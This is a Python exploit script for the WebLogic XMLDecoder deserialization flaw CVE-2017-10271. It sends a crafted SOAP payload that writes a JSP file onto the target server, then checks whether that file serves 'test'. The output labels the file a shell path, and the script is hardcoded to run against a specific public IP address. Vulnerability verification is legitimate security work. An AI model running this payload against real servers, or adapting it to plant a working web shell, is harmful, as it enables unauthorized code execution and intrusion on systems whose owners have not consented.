#!/usr/bin/env python3

'''
name: CVE-2017-10271漏洞
description: CVE-2017-10271漏洞可执行任意命令
'''

import os
import re
import json
import time
from app.lib.utils.request import request


class CVE_2017_10271_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'Content-Type': 'text/xml'
        }
        self.payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
                                              <soapenv:Header>
                                              <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                                              <java><java version="1.4.0" class="java.beans.XMLDecoder">
                                              <object class="java.io.PrintWriter"> 
                                              <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
                                              <void method="println"><string>
                                              <![CDATA[
                                              <% out.print("test"); %>
                                              ]]>
                                              </string>
                                              </void>
                                              <void method="close"/>
                                              </object></java></java>
                                              </work:WorkContext>
                                              </soapenv:Header>
                                              <soapenv:Body/>
                                              </soapenv:Envelope>
                                        '''


    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            if "/wls-wsat/CoordinatorPortType" not in self.url:
                payload_url = self.url + "/wls-wsat/CoordinatorPortType"
            result = request.post(payload_url, headers = self.headers,data = self.payload)
            check = request.get(self.url +  '/bea_wls_internal/test.jsp')
            if check.status_code == 200 and str(check.text).strip() == 'test':
                print ("存在CVE-2017-10271漏洞，shell文件路径为："+ self.url +'/bea_wls_internal/test.jsp')
                return True
            else:
                print("不存在CVE-2017-10271漏洞")
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    CVE_2017_10271 = CVE_2017_10271_BaseVerify('https://202.98.157.35:7005')
    CVE_2017_10271.run()


